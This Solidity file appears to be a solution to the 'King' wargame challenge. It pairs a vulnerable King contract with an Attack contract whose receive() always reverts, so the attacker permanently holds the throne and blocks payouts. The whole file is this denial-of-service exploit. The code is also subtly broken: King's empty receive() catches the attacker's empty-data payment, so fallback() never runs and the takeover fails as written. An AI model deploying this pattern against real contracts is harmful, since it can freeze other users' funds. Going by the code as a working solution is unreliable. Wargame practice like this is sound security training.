// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
  receive() external payable{
      
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

/****attack Contract****/

contract Attack{
    King instance;
    constructor(address payable _instance) public payable{
        instance = King(_instance);
        address(instance).call{value:1 ether}("");
    }
    receive() external payable{
        revert('nope');
    }
    
}
